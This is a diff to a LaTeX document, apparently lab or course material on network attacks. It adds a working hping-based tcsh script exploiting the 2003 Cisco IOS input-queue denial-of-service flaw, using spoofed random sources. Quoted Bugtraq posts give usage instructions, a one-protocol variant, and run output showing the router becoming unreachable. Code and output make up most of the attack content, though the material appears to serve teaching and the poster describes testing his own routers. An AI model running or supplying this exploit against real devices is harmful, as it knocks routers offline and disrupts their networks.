@@ -2798,7 +2798,7 @@ end
 another version:
 \begin{alltt}\scriptsize
 \small
-#!/bin/sh
+#!/bin/tcsh -f
 # 2003-07-21 pdonahue
 # cisco-44020.sh
 # -- this shell script is just a wrapper for hping (http://www.hping.org)
@@ -2808,13 +2808,125 @@ another version:
 # IPv4 Packets"
 # (http://www.cisco.com/warp/public/707/cisco-sa-20030717-blocked.shtml)
 #for more information
-...
-for protocol in $PROT
-    do
-       $HPING $HOST --rawip $ADDR --ttl $TTL --ipproto $protocol \\
-       --count $NUMB --interval u250 --data $SIZE --file /dev/urandom
-    done
+
+if ($1 == "" || $2 == "") then
+echo "usage: $0 <router hostname|address> <ttl>"
+exit
+endif
+
+foreach protocol (53 55 77 103)
+/usr/local/sbin/hping $1 --rawip --rand-source --ttl $2 --ipproto
+$protocol --count 19 --interval u250 --data 26
+end
 \end{alltt}
+
+% https://www.webhostingtalk.nl/bugtraq-mailing-lijst/27014-re-cisco-ios-exploit-44020-a.html#post69784
+% RE: Cisco IOS exploit (44020)
+% Thanks for the code, Pat. For those with a slightly older hping (rc1),
+% the --ipproto switch can be replaced with -H and the --rand-source flag
+% needs to be removed.
+
+% The -H and --ipproto switches are the same and I don't think there's any
+% need to have randomization of the source IP address for testing my own
+% devices so rc1 and rc2 should be able to test the devices equally well.
+
+% -----Original Message-----
+% From: Donahue, Pat [mailto:PDonahue@acmicorp.com]
+% Sent: Monday, July 21, 2003 1:19 PM
+% To: Martin Kluge; bugtraq@securityfocus.com
+% Subject: RE: Cisco IOS exploit (44020)
+
+
+% Here's a much simpler shell script that produces the same result:
+
+% --- BEGIN SHELL SCRIPT ---
+% #!/bin/tcsh -f
+
+% if ($1 == "" || $2 == "") then
+% echo "usage: $0 <router hostname|address> <ttl>"
+% exit
+% endif
+
+% foreach protocol (53 55 77 103)
+% /usr/local/sbin/hping $1 --rawip --rand-source --ttl $2 --ipproto
+% $protocol --count 19 --interval u250 --data 26
+% end
+% --- END SHELL SCRIPT ---
+
+% There's little reason to compile source code that will be run as root if
+% the same thing can be accomplished with a tool that has been used and
+% trusted by systems administrators for quite some time. Hping can be
+% found at http://www.hping.org and "is a command-line oriented TCP/IP
+% packet assembler/analyzer".
+
+% Before upgrading my routers, I wrote this script to confirm that they
+% were indeed vulnerable. As you can see, the script iterates over the
+% various protocols (SWIPE, IP Mobility, Sun ND, PIM) and sends 19 packets
+% each using hping for a total of 76 (one more than needed to fill up the
+% input queue).
+
+% What is interesting to note is that the input queue on the interface can
+% be exploited using just one of the vulnerable protocols; try changing
+% the "foreach protocol (53 55 77 103)" line to "foreach protocol (53)"
+% and then changing the "--count 19" parameter to "--count 76". When I
+% first read the security advisory I thought that Cisco had tried to make
+% it seem that all 4 were necessary.
+
+% You must be able to open raw sockets so either run the script as root or
+% set the suid bit. The syntax is: ./exploit.sh <hostname|address> <ttl>
+% where <hostname|address> is the hostname or IP address of the vulnerable
+% Cisco IOS device and <ttl> is the TTL subtracted by 255.
+
+% Here is an example:
+
+% > ping 192.168.1.1
+% PING 192.168.1.1 (192.168.1.1): 56 data bytes
+% 64 bytes from 192.168.1.1: icmp_seq=0 ttl=255 time=1.063 ms
+% ^C
+
+% > telnet 192.168.1.1
+% User Access Verification
+
+% Password:
+% telnet> close
+
+% # ./exploit.sh 192.168.1.1 0
+% HPING 192.168.1.1 (rl0 192.168.1.1): raw IP mode set, 20 headers + 26
+% data bytes
+% --- 192.168.1.1 hping statistic ---
+% 19 packets tramitted, 0 packets received, 100% packet loss
+% round-trip min/avg/max = 0.0/0.0/0.0 ms
+% HPING 192.168.1.1 (rl0 192.168.1.1): raw IP mode set, 20 headers + 26
+% data bytes
+% --- 192.168.1.1 hping statistic ---
+% 19 packets tramitted, 0 packets received, 100% packet loss
+% round-trip min/avg/max = 0.0/0.0/0.0 ms
+% HPING 192.168.1.1 (rl0 192.168.1.1): raw IP mode set, 20 headers + 26
+% data bytes
+% --- 192.168.1.1 hping statistic ---
+% 19 packets tramitted, 0 packets received, 100% packet loss
+% round-trip min/avg/max = 0.0/0.0/0.0 ms
+% HPING 192.168.1.1 (rl0 192.168.1.1): raw IP mode set, 20 headers + 26
+% data bytes
+% --- 192.168.1.1 hping statistic ---
+% 19 packets tramitted, 0 packets received, 100% packet loss
+% round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+% > telnet 192.168.1.1
+% Trying 192.168.1.1...
+% telnet: Unable to connect to remote host: No route to host
+
+% And finally, from the console:
+
+% Router> show int FastEthernet0/0 | include Input
+% Input queue: 75/75/0/0 (size/max/drops/flushes); Total output drops: 0
+%
+%
+% Regards,
+% Patrick Donahue
+% Network/Systems Administrator
+% ACMI Corporation
+
 
 {\bf Hints:}\\
 The tool we use can do a lot of different things, and you can control the speed. You can measure at the server being attacked or what you are sending, commonly using ifpps or such programs can help.
